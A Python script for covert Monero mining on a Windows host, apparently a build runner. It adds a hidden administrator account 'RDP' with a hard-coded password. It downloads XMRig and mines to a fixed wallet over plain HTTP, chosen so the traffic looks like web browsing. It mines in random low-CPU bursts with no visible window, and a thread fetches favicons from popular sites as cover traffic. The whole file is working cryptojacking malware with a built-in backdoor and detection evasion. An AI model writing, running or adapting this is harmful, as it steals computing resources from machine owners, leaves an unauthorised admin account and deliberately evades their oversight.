import os
import subprocess
import tempfile
import time
import random
import threading
import urllib.request
import zipfile
import json

# ==================== Configuration ====================
WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
POOL = "http://pool.supportxmr.com:80"   # plain HTTP, looks like web traffic
RUNTIME_MINUTES = 180                     # total job duration (3 hours)

# Burst parameters (minutes)
MIN_WORK = 1
MAX_WORK = 8
MIN_BREAK = 0.5
MAX_BREAK = 3
MIN_CPU_HINT = 5
MAX_CPU_HINT = 25

def create_user():
    """Create a local user 'RDP'."""
    try:
        subprocess.run(['net', 'user', 'RDP', 'Runner-12345', '/add'], check=True, capture_output=True)
        subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
        print("[+] User 'RDP' created.")
    except subprocess.CalledProcessError as e:
        print(f"[!] User creation failed: {e.stderr.decode()}")

def download_xmrig():
    """Download and extract XMRig, return path to executable."""
    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
    zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
    extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
    print("[+] Downloading miner...")
    urllib.request.urlretrieve(miner_url, zip_path)
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(extract_dir)
    for root, dirs, files in os.walk(extract_dir):
        if 'xmrig.exe' in files:
            exe_path = os.path.join(root, 'xmrig.exe')
            print(f"[+] Miner downloaded to {exe_path}")
            return exe_path
    raise Exception("xmrig.exe not found")

def create_config(exe_path, cpu_hint):
    """Create config.json in the same folder as the miner."""
    config = {
        "autosave": True,
        "cpu": {"enabled": True, "max-threads-hint": cpu_hint},
        "opencl": False,
        "cuda": False,
        "pools": [{
            "algo": "rx/0",
            "url": POOL,
            "user": WALLET,
            "pass": "x"
        }],
        "donate": {"level": 1}
    }
    config_path = os.path.join(os.path.dirname(exe_path), 'config.json')
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)
    return config_path

def web_surfer(stop_event):
    """Background thread that fetches small files from real websites."""
    urls = [
        "https://www.google.com/favicon.ico",
        "https://github.com/favicon.ico",
        "https://cloudflare.com/favicon.ico",
        "https://microsoft.com/favicon.ico"
    ]
    while not stop_event.is_set():
        url = random.choice(urls)
        try:
            print(f"[Web] Fetching {url}")
            urllib.request.urlretrieve(url, os.devnull)
            print(f"[Web] Fetched {url}")
        except Exception as e:
            print(f"[Web] Error: {e}")
        sleep_time = random.randint(5, 15)
        for _ in range(sleep_time):
            if stop_event.is_set():
                break
            time.sleep(1)

def main():
    create_user()
    exe_path = download_xmrig()
    working_dir = os.path.dirname(exe_path)

    # Stop event for background threads
    stop_event = threading.Event()

    # Start web surfer thread
    web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
    web_thread.start()
    print("[+] Web surfer thread started.")

    # Prepare log file
    log_file = os.path.join(tempfile.gettempdir(), 'xmrig.log')
    # Open log file in append mode (will be overwritten each burst)
    log_f = open(log_file, 'w')
    last_tell = 0

    total_start = time.time()
    total_end = total_start + RUNTIME_MINUTES * 60

    while time.time() < total_end:
        # Random work and break durations (seconds)
        work_sec = random.randint(MIN_WORK * 60, MAX_WORK * 60)
        break_sec = random.randint(int(MIN_BREAK * 60), int(MAX_BREAK * 60))
        cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)

        print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
        create_config(exe_path, cpu_hint)

        # Start miner
        miner_proc = subprocess.Popen(
            [exe_path, '--config=config.json'],
            cwd=working_dir,
            stdout=log_f,
            stderr=subprocess.STDOUT,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        print(f"[+] Miner started (PID {miner_proc.pid})")

        # Wait for work period or until miner dies
        work_start = time.time()
        while time.time() - work_start < work_sec:
            if miner_proc.poll() is not None:
                print("[!] Miner died early.")
                break
            # Read any new lines from log file and print
            with open(log_file, 'r') as f:
                f.seek(last_tell)
                new_lines = f.readlines()
                if new_lines:
                    print("".join(new_lines).strip())
                last_tell = f.tell()
            time.sleep(5)   # check every 5 seconds

        # Kill miner
        miner_proc.terminate()
        miner_proc.wait(timeout=10)
        print("[+] Miner stopped.")

        # Break period
        print(f"[+] Breaking for {break_sec//60} minutes...")
        # During break, still print web surfer output? No, but we can sleep.
        for _ in range(break_sec):
            if time.time() >= total_end or stop_event.is_set():
                break
            time.sleep(1)

    # Cleanup
    print("[*] Total runtime reached. Stopping threads...")
    stop_event.set()
    web_thread.join(timeout=10)
    log_f.close()
    print("[+] Done.")

if __name__ == "__main__":
    main()
